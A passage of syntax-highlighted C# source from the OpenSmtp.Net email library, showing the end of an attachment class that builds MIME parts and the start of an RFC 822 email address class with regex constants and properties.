        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;value&gt; Returns the path of an attached file&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">FilePath</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">filePath</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt; Returns the attachment size in bytes&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;value&gt;When the file is encoded it is stored in temp directory until sendMail() method is called.
</span><span class="sc0">        </span><span class="sc15">/// This property retrieves the path to that temp file.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">EncodedFilePath</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">encodedFilePath</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;summary&gt;Returns the MIME content-type for the supplied file extension&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;String MIME type (Example: </span><span class="sc18">\</span><span class="sc15">"text/plain\")&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">getMimeType</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">fileExtension</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">extKey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">ClassesRoot</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc11">fileExtension</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">contentType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc10">)</span><span class="sc11">extKey</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc6">"Content Type"</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">contentType</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">   
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">contentType</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0"> 
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"application/octet-stream"</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Exception</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"application/octet-stream"</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">CompareTo</span><span class="sc10">(</span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">attachment</span><span class="sc10">)</span><span class="sc0">        
        </span><span class="sc10">{</span><span class="sc0"> 
            </span><span class="sc2">// Order instances based on the Date         
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">.</span><span class="sc11">CompareTo</span><span class="sc10">(((</span><span class="sc11">Attachment</span><span class="sc10">)(</span><span class="sc11">attachment</span><span class="sc10">)).</span><span class="sc11">Name</span><span class="sc10">));</span><span class="sc0">        
        </span><span class="sc10">}</span><span class="sc0">   

        </span><span class="sc15">/// &lt;summary&gt;returns the file name from a parsed file path&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="filePath"&gt;UNC file path to file (IE: "C:\file.txt")&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;string file name (Example: </span><span class="sc18">\</span><span class="sc15">"test.zip\")&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">getFileName</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">filePath</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">filePath</span><span class="sc10">.</span><span class="sc11">LastIndexOf</span><span class="sc10">(</span><span class="sc6">"\\"</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// Encode the file for inclusion as a mime attachment.
</span><span class="sc0">        </span><span class="sc15">/// The boundaries are not provided.
</span><span class="sc0">        </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;&lt;/returns&gt;
</span><span class="sc0">        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">ToMime</span><span class="sc10">()</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ContentId</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-ID: &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ContentId</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-Type: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mimeType</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">";\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">" name=\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertToQP</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-Transfer-Encoding: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">encoding</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-Disposition: attachment;\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">" filename=\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertToQP</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"\r\n\r\n"</span><span class="sc10">);</span><span class="sc0">
                    
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">encodedFilePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">bin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc4">76</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">76</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">.</span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">UTF8</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)+</span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">OpenSmtp</span><span class="sc10">.</span><span class="sc11">Mail</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">



</span><span class="sc3">/******************************************************************************

    Copyright 2001-2005 Ian Stallings

    OpenSmtp.Net is free software; you can redistribute it and/or modify

    it under the terms of the Lesser GNU General Public License as published by

    the Free Software Foundation; either version 2 of the License, or

    (at your option) any later version.



    OpenSmtp.Net is distributed in the hope that it will be useful,

    but WITHOUT ANY WARRANTY; without even the implied warranty of

    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the

    Lesser GNU General Public License for more details.



    You should have received a copy of the Lesser GNU General Public License

    along with this program; if not, write to the Free Software

    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

/*******************************************************************************/</span><span class="sc0">



    </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">.</span><span class="sc11">RegularExpressions</span><span class="sc10">;</span><span class="sc0">



    </span><span class="sc15">/// &lt;summary&gt;This enumeration stores the Address type&lt;/summary&gt;
</span><span class="sc0">
    </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">
    </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">
    </span><span class="sc15">/// msg.AddRecipient(ccAddress, AddressType.Cc);
</span><span class="sc0">
    </span><span class="sc15">/// msg.AddRecipient(bccAddress, AddressType.Bcc);
</span><span class="sc0">
    </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">
    </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">
    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">enum</span><span class="sc0"> </span><span class="sc11">AddressType</span><span class="sc0">

    </span><span class="sc10">{</span><span class="sc0">

       </span><span class="sc11">To</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0">

       </span><span class="sc11">Cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0">

       </span><span class="sc11">Bcc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">



    </span><span class="sc15">/// &lt;summary&gt;This Type stores a rfc822 email address and a name for that
</span><span class="sc0">
    </span><span class="sc15">/// particular address (Example: "John Smith, jsmith@nowhere.com")
</span><span class="sc0">
    </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">
    </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">
    </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">
    </span><span class="sc15">/// EmailAddress from = new EmailAddress("user@url.com", "John Smith");
</span><span class="sc0">
    </span><span class="sc15">/// EmailAddress to = new EmailAddress("support@OpenSmtp.com");
</span><span class="sc0">
    </span><span class="sc15">/// MailMessage msg = new MailMessage(from, to);
</span><span class="sc0">
    </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">
    </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">
    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc0">

    </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0">    </span><span class="sc16">string</span><span class="sc0">  </span><span class="sc11">address</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0">    </span><span class="sc16">string</span><span class="sc0">  </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0">    </span><span class="sc16">string</span><span class="sc0">  </span><span class="sc11">mailbox</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0">    </span><span class="sc16">string</span><span class="sc0">  </span><span class="sc11">localpart</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0">     </span><span class="sc16">string</span><span class="sc0">  </span><span class="sc11">domain</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0">     </span><span class="sc16">string</span><span class="sc0">  </span><span class="sc11">quotedstr</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0">     </span><span class="sc16">bool</span><span class="sc0">    </span><span class="sc11">isvalid</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">



        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Escape</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\\"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Period</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\."</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Space</span><span class="sc0">      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\040"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Tab</span><span class="sc0">        </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\t"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">OpenBr</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\["</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">CloseBr</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\]"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">OpenParen</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\("</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">CloseParen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\)"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">NonAscii</span><span class="sc0">   </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\x80-\xff"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Ctrl</span><span class="sc0">       </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\000-\037"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">CRList</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\n\015"</span><span class="sc10">;</span><span class="sc0">

        



        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">InitializeRegex</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc15">/// &lt;summary&gt;Constructor using RFC 822 formatted email mesage&lt;/summary&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;code&gt;EmailAddress a = new EmailAddress("support@OpenSmtp.com");&lt;/code&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">)</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">VerifyAddresses</span><span class="sc10">)</span><span class="sc0">

            </span><span class="sc10">{</span><span class="sc0">

                </span><span class="sc2">//EmailAddress.initregex();     
</span><span class="sc0">
                </span><span class="sc11">Parse</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0">



            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        

        </span><span class="sc15">/// &lt;summary&gt;Constructor using RFC 822 formatted email mesage and a friendly 
</span><span class="sc0">
        </span><span class="sc15">/// name associated with that email address&lt;/summary&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;code&gt;EmailAddress a = new EmailAddress("support@OpenSmtp.com", "John Smith");&lt;/code&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">VerifyAddresses</span><span class="sc10">)</span><span class="sc0">

            </span><span class="sc10">{</span><span class="sc0">

                </span><span class="sc2">//initregex();
</span><span class="sc0">
                </span><span class="sc11">Parse</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0">

            

            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc15">/// &lt;value&gt;Stores a RFC 822 formatted message&lt;/value&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;seealso cref="SmtpConfig.VerifyAddresses"/&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;example&gt;"support@OpenSmtp.com"&lt;/example&gt;
</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Address</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> 

                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">VerifyAddresses</span><span class="sc10">)</span><span class="sc0">

                    </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">Parse</span><span class="sc10">(</span><span class="sc11">value</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> 

                </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc15">/// &lt;value&gt;Stores a name associated with the Address&lt;/value&gt;
</span><span class="sc0">
        </span><span class="sc15">/// &lt;example&gt;"John Smith"&lt;/example&gt;
</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Name</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">LocalPart</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">localpart</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Domain</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">QuotedString</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">quotedstr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Mailbox</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">mailbox</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">IsValid</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">isvalid</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">



